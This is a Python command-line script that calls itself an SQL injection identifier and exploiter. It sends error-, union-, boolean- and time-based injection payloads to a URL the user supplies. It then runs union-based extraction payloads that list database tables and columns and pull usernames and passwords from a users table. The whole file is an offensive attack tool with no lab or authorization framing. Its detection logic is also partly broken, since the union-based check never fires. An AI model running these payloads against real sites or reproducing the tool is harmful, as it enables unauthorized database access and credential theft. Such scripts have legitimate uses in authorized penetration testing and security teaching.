"""
Title: SQL Injection Identifier and Exploiter
Description: Fuzzes target URL with SQL Injection payloads and identifies injection vulnerabilities.
Author: Chris Quinn
"""
import requests
import argparse
from datetime import datetime

def parse_input():
    """
    Parse and validate command-line arguments.
    Returns: tuple: (url, parameter, method, proxy)
    """
    parser = argparse.ArgumentParser(description="SQL Injection Identification and Exploitation Script")
    parser.add_argument("-u", required=True, help="URL to target (e.g., http://example.com/vuln.php)")
    parser.add_argument("-p", help="Vulnerable parameter name (e.g., 'id')")
    parser.add_argument("-m", default="GET", choices=["GET", "POST"],
                        help="HTTP method to use: GET or POST (default: GET)")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    args = parser.parse_args()

    # Validate URL starts with http:// or https://
    if not args.u.startswith(("http://", "https://")):
        parser.error("The URL must start with 'http://' or 'https://'.")

    param = args.p.strip() if args.p else None
    return args.u.strip(), param, args.m, args.proxy

def get_payloads():
    """
    Define payloads for SQL injection testing.
    Returns: dict
    """
    return {
        "error_based": [
            "' OR 1=1 --",
            "' AND 1=CONVERT(int, (SELECT @@version)) --"
        ],
        "union_based": [
            "' UNION SELECT NULL, NULL --",
            "' UNION SELECT username, password FROM users --"
        ],
        "boolean_based": [
            "' AND 1=1 --",
            "' AND 1=2 --"
        ],
        "time_based": [
            "' OR IF(1=1, SLEEP(5), 0) --",
            "' AND IF(1=1, SLEEP(5), 0) --"
        ]
    }

def test_injection(url, param, method, payloads, proxies):
    """
    Test SQL injection payloads and analyze responses.
    Returns:
        list: Vulnerable attack types.
    """
    vulnerable_types = []

    for attack_type, attack_payloads in payloads.items():
        print(f"\n[+] Testing {attack_type} injections...")
        for payload in attack_payloads:
            try:
                if method == "GET":
                    full_payload = f"{url}?{param}={payload}"
                    response = requests.get(full_payload, timeout=10, proxies=proxies)
                elif method == "POST":
                    data = {param: payload}
                    response = requests.post(url, data=data, timeout=10, proxies=proxies)
                    full_payload = f"POST Data: {data}"
                else:
                    print(f"[-] Unsupported HTTP method: {method}")
                    return []

                # Analyze the response
                if analyze_response(response, attack_type, payload, full_payload):
                    vulnerable_types.append(attack_type)
                    break  # Stop testing this type once confirmed
            except requests.RequestException as e:
                print(f"[-] Request failed: {e}")
                continue

    return list(set(vulnerable_types))  # Remove duplicates

def analyze_response(response, attack_type, payload, full_payload):
    """
    Analyze the HTTP response to determine if the payload succeeded.
    Returns:
        bool: True if vulnerability detected, False otherwise.
    """
    if attack_type == "error_based" and any(
        error in response.text.lower() for error in ["syntax error", "unclosed quotation mark", "unknown column"]
    ):
        print(f"[+] Vulnerability detected with payload: {payload}")
        log_result(full_payload, response.text)
        return True

    elif attack_type == "boolean_based" and "true" in response.text.lower():
        print(f"[+] Boolean-based injection succeeded: {payload}")
        log_result(full_payload, response.text)
        return True

    elif attack_type == "time_based" and response.elapsed.total_seconds() > 5:
        print(f"[+] Time-based injection succeeded: {payload}")
        log_result(full_payload, f"Delay: {response.elapsed.total_seconds()} seconds")
        return True

    print(f"[-] No success detected for payload: {payload}")
    return False

def extract_data(url, param, method, vulnerable_types, proxies):
    """
    Exploit SQL injection to extract data from the database.
    Args:
        url (str): Target URL.
        param (str): Vulnerable parameter to test.
        method (str): HTTP method (GET or POST).
        vulnerable_types (list): List of detected vulnerable attack types.
        proxies (dict): Proxy configuration.
    """
    # Define extraction payloads specific to union-based vulnerabilities
    union_extraction_payloads = [
        "' UNION SELECT table_name, NULL FROM information_schema.tables --",
        "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --",
        "' UNION SELECT username, password FROM users --"
    ]

    if "union_based" in vulnerable_types:
        print("\n[+] Attempting data extraction using union-based injections...")
        for payload in union_extraction_payloads:
            try:
                if method == "GET":
                    injected_url = f"{url}?{param}={payload}"
                    response = requests.get(injected_url, timeout=10, proxies=proxies)
                elif method == "POST":
                    data = {param: payload}
                    response = requests.post(url, data=data, timeout=10, proxies=proxies)
                else:
                    print(f"[-] Unsupported HTTP method: {method}")
                    return

                # Parse and display results
                print(f"\n[+] Payload: {payload}")
                print(f"Response:\n{response.text[:500]}...\n")  # Log first 500 characters
            except requests.RequestException as e:
                print(f"[-] Request failed: {e}")

def log_result(payload, response_excerpt):
    """
    Log successful payloads and response excerpts to a file.
    """
    with open("sql_injection_results.txt", "a") as log_file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file.write(f"Timestamp: {timestamp}\n")
        log_file.write(f"Payload: {payload}\n")
        log_file.write(f"Response: {response_excerpt[:200]}...\n")
        log_file.write(f"{'-' * 50}\n")

if __name__ == "__main__":
    url, param, method, proxy = parse_input()
    payloads = get_payloads()
    
    proxies = {"http": proxy, "https": proxy} if proxy else None
    vulnerable_types = test_injection(url, param, method, payloads, proxies)
    
    if vulnerable_types:
        print(f"\n[+] Vulnerabilities detected: {', '.join(vulnerable_types)}")
        extract_data(url, param, method, vulnerable_types, proxies)
    else:
        print("[-] No vulnerabilities detected.")
